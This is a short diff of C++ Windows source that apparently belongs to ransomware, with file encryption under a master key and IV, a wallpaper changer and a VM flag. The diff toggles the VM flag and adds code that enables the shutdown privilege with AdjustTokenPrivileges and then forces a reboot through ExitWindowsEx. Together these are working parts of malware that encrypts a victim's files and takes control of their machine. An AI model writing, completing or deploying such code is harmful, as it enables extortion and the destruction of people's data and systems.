@@ -3,7 +3,7 @@
 #include <stdexcept>
 #define LIMIT_CPU_FAIL 0
 
-#define VM 1
+#define VM 0
 #if 1
 using namespace boost::filesystem;
 using std::string;
@@ -28,7 +28,6 @@ void RegisterProgram();
 
 int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
-	
 	PBYTE masterIV = nullptr, masterKey = nullptr;
 	string path = ROOT_DIR;
 	string pathToImage = get_path_to_jpeg();
@@ -303,6 +302,7 @@ void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 	PBYTE plainText = nullptr;
 	size_t plainTextLen = getFileSize(path);
 	
+	
 	PBYTE iv = nullptr;
 	PBYTE key = nullptr;
 
@@ -448,7 +448,17 @@ Status changeWallPaper(const string& path)
 
 void doRestart()
 {
-	InitiateSystemShutdown(NULL, NULL, 0, true, true);
+	HANDLE hToken = NULL;
+	LUID luid;
+	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
+	LookupPrivilegeValue("", SE_SHUTDOWN_NAME, &luid);
+	TOKEN_PRIVILEGES tp;
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, 0);
+
+	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
 }
 
 
